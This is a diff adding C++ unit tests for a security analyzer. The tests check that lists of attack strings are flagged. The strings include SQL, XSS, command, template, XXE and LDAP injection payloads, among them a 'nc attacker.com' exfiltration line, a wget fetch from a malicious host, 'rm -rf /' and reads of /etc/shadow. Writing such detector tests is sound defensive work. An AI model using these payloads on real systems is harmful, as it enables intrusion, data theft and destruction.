@@ -3,6 +3,7 @@
 #include <vector>
 #include <filesystem>
 #include <string>
+#include <algorithm>
 #include "../securityAnalyzer/SecurityAnalyzer.h"
 
 namespace fs = std::filesystem;
@@ -114,6 +115,207 @@ TEST_F(SecurityAnalyzerTest, TestLargeTextFileSizeExceeded) {
                                 result.detected_issues.end(),
                                 "File size exceeds maximum allowed size") != result.detected_issues.end();
     EXPECT_TRUE(size_issue);
+}
+
+// Enhanced code injection detection tests
+TEST_F(SecurityAnalyzerTest, TestSQLInjectionDetection) {
+    std::vector<std::string> sql_attacks = {
+        "SELECT * FROM users WHERE id = '1' OR 1=1--",
+        "admin' UNION SELECT password FROM users--",
+        "'; DROP TABLE users; --",
+        "' OR '1'='1",
+        "' HAVING '1'='1",
+        "test'; exec xp_cmdshell('dir')--"
+    };
+    
+    for (const auto& attack : sql_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "SQL injection not detected: " << attack;
+        bool has_sql_injection = std::any_of(result.detected_issues.begin(), 
+                                           result.detected_issues.end(),
+                                           [](const std::string& issue) {
+                                               return issue.find("SQL injection") != std::string::npos;
+                                           });
+        EXPECT_TRUE(has_sql_injection) << "SQL injection issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestXSSDetection) {
+    std::vector<std::string> xss_attacks = {
+        "<script>alert('XSS')</script>",
+        "javascript:alert('XSS')",
+        "<img src=x onerror=alert('XSS')>",
+        "<div onclick='alert(\"XSS\")'>Click me</div>",
+        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "document.write('<script>alert(\"XSS\")</script>')"
+    };
+    
+    for (const auto& attack : xss_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "XSS not detected: " << attack;
+        bool has_xss = std::any_of(result.detected_issues.begin(), 
+                                 result.detected_issues.end(),
+                                 [](const std::string& issue) {
+                                     return issue.find("XSS") != std::string::npos;
+                                 });
+        EXPECT_TRUE(has_xss) << "XSS issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestCommandInjectionDetection) {
+    std::vector<std::string> cmd_attacks = {
+        "test; rm -rf /",
+        "file.txt & echo 'injected'",
+        "data | nc attacker.com 1234",
+        "input; wget http://malicious.com/script.sh",
+        "test; cat /etc/passwd",
+        "$(whoami)",
+        "`id`",
+        "file && rm -rf *"
+    };
+    
+    for (const auto& attack : cmd_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "Command injection not detected: " << attack;
+        bool has_cmd_injection = std::any_of(result.detected_issues.begin(), 
+                                            result.detected_issues.end(),
+                                            [](const std::string& issue) {
+                                                return issue.find("command injection") != std::string::npos;
+                                            });
+        EXPECT_TRUE(has_cmd_injection) << "Command injection issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestNoSQLInjectionDetection) {
+    std::vector<std::string> nosql_attacks = {
+        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+        "admin\"; return true; var x=\"",
+        "{\"$where\": \"this.username == this.password\"}",
+        "'; return db.users.find(); var x='",
+        "{\"user\": {\"$regex\": \".*\"}, \"pass\": {\"$regex\": \".*\"}}"
+    };
+    
+    for (const auto& attack : nosql_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "NoSQL injection not detected: " << attack;
+        bool has_nosql_injection = std::any_of(result.detected_issues.begin(), 
+                                              result.detected_issues.end(),
+                                              [](const std::string& issue) {
+                                                  return issue.find("NoSQL injection") != std::string::npos;
+                                              });
+        EXPECT_TRUE(has_nosql_injection) << "NoSQL injection issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestPathTraversalDetection) {
+    std::vector<std::string> path_attacks = {
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "....//....//....//etc/passwd",
+        "/etc/shadow",
+        "C:\\windows\\system32\\drivers\\etc\\hosts"
+    };
+    
+    for (const auto& attack : path_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "Path traversal not detected: " << attack;
+        bool has_path_traversal = std::any_of(result.detected_issues.begin(), 
+                                             result.detected_issues.end(),
+                                             [](const std::string& issue) {
+                                                 return issue.find("path traversal") != std::string::npos;
+                                             });
+        EXPECT_TRUE(has_path_traversal) << "Path traversal issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestTemplateInjectionDetection) {
+    std::vector<std::string> template_attacks = {
+        "{{7*7}}",
+        "${7*7}",
+        "<%=7*7%>",
+        "#{7*7}",
+        "{{config.items()}}",
+        "${__import__('os').system('id')}",
+        "<%=system('id')%>"
+    };
+    
+    for (const auto& attack : template_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "Template injection not detected: " << attack;
+        bool has_template_injection = std::any_of(result.detected_issues.begin(), 
+                                                 result.detected_issues.end(),
+                                                 [](const std::string& issue) {
+                                                     return issue.find("template injection") != std::string::npos;
+                                                 });
+        EXPECT_TRUE(has_template_injection) << "Template injection issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestCodeExecutionDetection) {
+    std::vector<std::string> exec_attacks = {
+        "system('rm -rf /')",
+        "exec('whoami')",
+        "eval('malicious_code')",
+        "__import__('os').system('id')",
+        "shell_exec('cat /etc/passwd')",
+        "file_get_contents('/etc/passwd')",
+        "fopen('/etc/shadow', 'r')"
+    };
+    
+    for (const auto& attack : exec_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "Code execution not detected: " << attack;
+        bool has_code_exec = std::any_of(result.detected_issues.begin(), 
+                                        result.detected_issues.end(),
+                                        [](const std::string& issue) {
+                                            return issue.find("code execution") != std::string::npos;
+                                        });
+        EXPECT_TRUE(has_code_exec) << "Code execution issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestXMLXXEDetection) {
+    std::vector<std::string> xml_attacks = {
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
+        "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>"
+    };
+    
+    for (const auto& attack : xml_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "XML/XXE not detected: " << attack;
+        bool has_xml_injection = std::any_of(result.detected_issues.begin(), 
+                                            result.detected_issues.end(),
+                                            [](const std::string& issue) {
+                                                return issue.find("XML") != std::string::npos || 
+                                                       issue.find("XXE") != std::string::npos;
+                                            });
+        EXPECT_TRUE(has_xml_injection) << "XML/XXE issue not flagged for: " << attack;
+    }
+}
+
+TEST_F(SecurityAnalyzerTest, TestLDAPInjectionDetection) {
+    std::vector<std::string> ldap_attacks = {
+        ")(cn=*)",
+        ")(uid=*)(|(uid=*))",
+        "admin*",
+        "*admin",
+        ")(|(uid=*)(userPassword=*))",
+        ")(objectClass=*)"
+    };
+    
+    for (const auto& attack : ldap_attacks) {
+        auto result = analyzer.analyzeText(attack);
+        EXPECT_FALSE(result.is_safe) << "LDAP injection not detected: " << attack;
+        bool has_ldap_injection = std::any_of(result.detected_issues.begin(), 
+                                             result.detected_issues.end(),
+                                             [](const std::string& issue) {
+                                                 return issue.find("LDAP injection") != std::string::npos;
+                                             });
+        EXPECT_TRUE(has_ldap_injection) << "LDAP injection issue not flagged for: " << attack;
+    }
 }
 
 int main(int argc, char **argv) {
